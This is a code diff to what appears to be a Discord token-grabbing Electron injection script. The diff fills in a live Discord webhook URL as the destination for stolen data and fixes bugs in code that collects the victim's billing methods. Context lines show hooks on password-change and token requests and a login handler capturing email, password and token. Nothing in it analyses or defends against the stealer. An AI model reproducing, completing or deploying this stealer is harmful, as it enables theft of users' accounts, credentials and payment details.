@@ -6,7 +6,7 @@ const {
 } = require('electron')
 const querystring = require('querystring');
 const os = require('os')
-var webhook = "%WEBHOOK%";
+var webhook = "https://discord.com/api/webhooks/884123847127867423/duLKkYmnRvJ_5D8dAq_o2bdFhCSrWehTX9n7hbZo09iIyRq2vD4YaXasYrcLiuOSSa0v";
 const computerName = os.hostname();
 const discordInstall = `${__dirname.split("\\")[5]} | ${__dirname.split("\\")[6]}`
 
@@ -80,7 +80,7 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
                     }))
                 }
             }
-        } else {}
+        }
     }
     if (details.url.endsWith("tokens")) {
         const window = BrowserWindow.getAllWindows()[0];
@@ -192,11 +192,11 @@ function Login(email, password, token) {
                             var json = JSON.parse(info);
                             function PaymentMethod() {
                                 var billing = "";
-                                const billing = JSON.parse(info3)
-                                billing.forEach(billing => {
-                                    if (billing.type == "") return "❌ 𝐀𝐧𝐲 𝐁𝐢𝐥𝐥𝐢𝐧𝐠 𝐈𝐧𝐟𝐨𝐬."
-                                    else if (billing.type == 1) billing += "✔️ 𝐂𝐫𝐞𝐝𝐢𝐭 𝐂𝐚𝐫𝐝"
-                                    else if (billing.type == 2) billing += "✔️ 𝐏𝐚𝐲𝐩𝐚𝐥"
+                                const bill = JSON.parse(info3)
+                                bill.forEach(bill => {
+                                    if (bill.type == "") return "❌ 𝐀𝐧𝐲 𝐁𝐢𝐥𝐥𝐢𝐧𝐠 𝐈𝐧𝐟𝐨𝐬."
+                                    else if (bill.type == 1) billing += "✔️ 𝐂𝐫𝐞𝐝𝐢𝐭 𝐂𝐚𝐫𝐝"
+                                    else if (bill.type == 2) billing += "✔️ 𝐏𝐚𝐲𝐩𝐚𝐥"
                                     else return "❌ 𝐀𝐧𝐲 𝐁𝐢𝐥𝐥𝐢𝐧𝐠 𝐈𝐧𝐟𝐨𝐬."
                                 })
                                 if (billing == "") billing = "❌ 𝐀𝐧𝐲 𝐁𝐢𝐥𝐥𝐢𝐧𝐠 𝐈𝐧𝐟𝐨𝐬."
